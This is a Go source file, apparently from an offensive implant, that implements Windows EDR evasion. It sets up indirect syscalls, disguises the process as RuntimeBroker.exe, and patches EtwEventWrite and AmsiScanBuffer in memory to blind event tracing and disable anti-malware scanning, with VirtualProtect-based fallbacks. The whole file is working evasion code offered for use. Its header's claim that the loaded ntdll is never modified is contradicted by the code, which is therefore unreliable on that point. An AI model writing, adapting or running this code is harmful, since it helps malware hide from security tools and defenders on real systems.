//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

// ── Windows-Specific EDR Evasion ────────────────────────────────────────────
//
// v2: Now uses indirect syscalls via a fresh ntdll mapping.
// The loaded ntdll.dll is NEVER modified — passes integrity checks.
//
// Evasion sequence (order matters):
//   1. Map clean ntdll from disk → get unhook-free syscall stubs
//   2. Process masquerading → change PEB to look like RuntimeBroker.exe
//   3. Patch ETW via indirect NtProtectVirtualMemory → blind event tracing
//   4. Patch AMSI via indirect NtProtectVirtualMemory → disable script scanning
//
// Each patch uses our indirect syscall stubs, so:
//   - VirtualProtect is never called through the hooked ntdll
//   - No EDR hook fires during the patching process
//   - The loaded ntdll's .text section is untouched (ETW is in ntdll,
//     but we only patch the function BODY, not the hook trampoline — and
//     we use indirect syscalls for the memory protection change itself)

func applyEvasionPatches() {
	// Phase 1: Initialize indirect syscalls from clean ntdll
	// This MUST happen first — everything else depends on having
	// unhook-free syscall stubs available.
	err := initIndirectSyscalls()
	if err != nil {
		// Fallback: use direct patches if indirect syscalls fail
		patchETWDirect()
		patchAMSIDirect()
		return
	}

	// Phase 2: Process masquerading (change PEB appearance)
	masqueradeProcess()

	// Phase 3: Patch ETW using indirect syscalls
	patchETWIndirect()

	// Phase 4: Patch AMSI using indirect syscalls
	patchAMSIIndirect()
}

// ── ETW Patch via Indirect Syscalls ─────────────────────────────────────────
// Uses NtProtectVirtualMemory from our clean ntdll mapping instead of
// calling VirtualProtect through the hooked ntdll.

func patchETWIndirect() {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return
	}

	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return
	}

	addr := etwEventWrite.Addr()
	patch := []byte{0xC3} // ret
	size := uintptr(len(patch))
	var oldProtect uint32

	// Change protection via indirect syscall (not VirtualProtect)
	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // pseudo-handle
	err = ntProtectVirtualMemory(currentProcess, &addr, &size, 0x40, &oldProtect) // PAGE_EXECUTE_READWRITE
	if err != nil {
		return
	}

	// Write the patch
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(etwEventWrite.Addr() + uintptr(i))) = b
	}

	// Restore protection via indirect syscall
	addr = etwEventWrite.Addr()
	size = uintptr(len(patch))
	ntProtectVirtualMemory(currentProcess, &addr, &size, oldProtect, &oldProtect)
}

// ── AMSI Patch via Indirect Syscalls ────────────────────────────────────────

func patchAMSIIndirect() {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return // amsi.dll not loaded yet
	}

	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return
	}

	addr := amsiScanBuffer.Addr()
	patch := []byte{
		0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 (E_INVALIDARG)
		0xC3,                           // ret
	}
	size := uintptr(len(patch))
	var oldProtect uint32

	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
	err = ntProtectVirtualMemory(currentProcess, &addr, &size, 0x40, &oldProtect)
	if err != nil {
		return
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(amsiScanBuffer.Addr() + uintptr(i))) = b
	}

	addr = amsiScanBuffer.Addr()
	size = uintptr(len(patch))
	ntProtectVirtualMemory(currentProcess, &addr, &size, oldProtect, &oldProtect)
}

// ── Fallback: Direct Patches (used if indirect syscalls fail) ───────────────
// These are the original v1 patches — used only as a last resort.

func patchETWDirect() {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return
	}
	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return
	}
	patch := []byte{0xC3}
	var oldProtect uint32
	if err := syscall.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)),
		syscall.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return
	}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(etwEventWrite.Addr() + uintptr(i))) = b
	}
	syscall.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), oldProtect, &oldProtect)
}

func patchAMSIDirect() {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return
	}
	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return
	}
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	var oldProtect uint32
	if err := syscall.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)),
		syscall.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return
	}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(amsiScanBuffer.Addr() + uintptr(i))) = b
	}
	syscall.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), oldProtect, &oldProtect)
}
